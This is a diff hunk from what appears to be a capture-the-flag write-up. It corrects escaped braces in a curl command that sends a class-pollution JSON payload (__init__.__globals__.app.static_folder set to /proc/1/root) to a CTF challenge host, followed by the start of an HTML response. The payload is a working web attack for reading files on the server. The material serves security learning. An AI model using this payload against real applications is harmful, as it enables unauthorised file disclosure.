@@ -287,7 +287,7 @@ if __name__ == '__main__':
 
 ```curl
 ┌──(kali1㉿kali)-[~]
-└─$ curl -s -X POST "http://nc1.ctfplus.cn:31200/" -H 'Content-Type: application/json' \  --data '{"__init__":{"__globals__":{"app":{"static_folder":"/proc/1/root"&#125;&#125;&#125;&#125;'
+└─$ curl -s -X POST "http://nc1.ctfplus.cn:31200/" -H 'Content-Type: application/json' \  --data '{"__init__":{"__globals__":{"app":{"static_folder":"/proc/1/root"}}}}'
 <!DOCTYPE html>
 <html lang="en">
 <head>
